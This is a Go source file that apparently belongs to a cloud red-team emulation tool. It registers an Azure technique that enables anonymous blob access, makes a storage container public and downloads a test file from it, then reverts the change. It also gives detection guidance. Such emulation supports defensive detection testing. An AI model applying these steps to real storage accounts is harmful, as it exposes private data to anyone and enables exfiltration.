package azure

import (
	"context"
	_ "embed"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/storage/armstorage"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob/container"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.exfiltration.storage-public-access",
		FriendlyName: "Exfiltrate Azure Storage via public access",
		Description: `
Modify storage policies to download content in an Azure storage account.

References:

- https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/
- https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure

Warm-up: 

- Create a storage account with anonymous blob access disabled
- Create a storage container with an empty test file

Detonation: 

- Enable anonymous blob access on the storage account
- Change storage container access level to allow public access (anonymous access to containers and blobs)
- Download test file from the public container
`,
		Detection: `
Monitor Azure Activity Logs for storage account property changes, specifically <code>Microsoft.Storage/storageAccounts/write</code> operations that modify network access rules.

Sample Azure Activity Log event to monitor:

` + codeBlock + `json hl_lines="2 5"
    "operationName": {
        "value": "Microsoft.Storage/storageAccounts/write",
        "localizedValue": "Create/Update Storage Account"
    },
    "properties": {
        "requestbody": "{\"properties\":{\"allowBlobPublicAccess\":true}}",
        "eventCategory": "Administrative",
        "entity": "/subscriptions/[SUBSCRIPTION-ID]/resourceGroups/stratus-red-team-storage-storage-6m6k/providers/Microsoft.Storage/storageAccounts/stratusredteamstorage",
        "message": "Microsoft.Storage/storageAccounts/write",
        "hierarchy": "[REMOVED]"
    }
` + codeBlock + `

Also monitor for unusual blob download activity from newly allowed IP addresses.
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               true,
		IsSlow:                     false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	storageAccountName := params["storage_account_name"]
	containerName := params["container_name"]
	resourceGroup := params["resource_group"]

	// Get Azure storage accounts client
	storageAccountsClient, err := getAzureStorageAccountsClient(providers.Azure())
	if err != nil {
		return fmt.Errorf("unable to instantiate Azure storage accounts client: %w", err)
	}

	// Enable anonymous blob access on the storage account
	log.Println("Enabling anonymous blob access on storage account " + storageAccountName)
	_, err = storageAccountsClient.Update(ctx, resourceGroup, storageAccountName, armstorage.AccountUpdateParameters{
		Properties: &armstorage.AccountPropertiesUpdateParameters{
			AllowBlobPublicAccess: to.Ptr(true),
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("unable to enable anonymous blob access: %w", err)
	}
	log.Println("Successfully enabled anonymous blob access on storage account")

	// Wait for the configuration to propagate
	log.Println("Waiting 15 seconds for configuration to propagate...")
	time.Sleep(15 * time.Second)

	// Change container access level to public access (Container)
	log.Println("Setting container " + containerName + " to Container access level (anonymous read access for containers and blobs)")
	blobServiceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccountName)
	blobClient, err := azblob.NewClient(blobServiceURL, providers.Azure().GetCredentials(), nil)
	if err != nil {
		return fmt.Errorf("unable to create blob service client: %w", err)
	}

	containerClient := blobClient.ServiceClient().NewContainerClient(containerName)
	_, err = containerClient.SetAccessPolicy(ctx, &container.SetAccessPolicyOptions{
		Access: to.Ptr(container.PublicAccessTypeContainer),
	})
	if err != nil {
		return fmt.Errorf("unable to set container access policy: %w", err)
	}
	log.Println("Successfully set container to public access level")

	// Download test file
	blobURL := fmt.Sprintf("https://%s.blob.core.windows.net/%s/sample-file.txt", storageAccountName, containerName)
	log.Println("Downloading test file from public container: " + blobURL)

	resp, err := http.Get(blobURL)
	if err != nil {
		return fmt.Errorf("unable to download blob via public URL: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status code when downloading blob: %d", resp.StatusCode)
	}
	_, err = io.Copy(io.Discard, resp.Body)
	if err != nil {
		return fmt.Errorf("unable to read blob content: %w", err)
	}

	log.Println("Successfully accessed test file from public blob storage")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	storageAccountName := params["storage_account_name"]
	containerName := params["container_name"]
	resourceGroup := params["resource_group"]

	storageAccountsClient, err := getAzureStorageAccountsClient(providers.Azure())
	if err != nil {
		return fmt.Errorf("unable to instantiate Azure storage accounts client: %w", err)
	}

	// Set container access to Private
	log.Println("Setting container " + containerName + " back to private access")
	blobServiceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccountName)
	blobClient, err := azblob.NewClient(blobServiceURL, providers.Azure().GetCredentials(), nil)
	if err != nil {
		return fmt.Errorf("unable to create blob service client: %w", err)
	}

	containerClient := blobClient.ServiceClient().NewContainerClient(containerName)
	_, err = containerClient.SetAccessPolicy(ctx, &container.SetAccessPolicyOptions{
		Access: nil,
	})
	if err != nil {
		return fmt.Errorf("unable to set container access policy to private: %w", err)
	}
	log.Println("Successfully set container back to private access")

	// Disable anonymous blob access on the storage account
	log.Println("Disabling anonymous blob access on storage account " + storageAccountName)
	_, err = storageAccountsClient.Update(ctx, resourceGroup, storageAccountName, armstorage.AccountUpdateParameters{
		Properties: &armstorage.AccountPropertiesUpdateParameters{
			AllowBlobPublicAccess: to.Ptr(false),
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("unable to disable anonymous blob access: %w", err)
	}

	log.Println("Successfully disabled anonymous blob access on storage account")
	return nil
}

func getAzureStorageAccountsClient(azure *providers.AzureProvider) (*armstorage.AccountsClient, error) {
	return armstorage.NewAccountsClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}
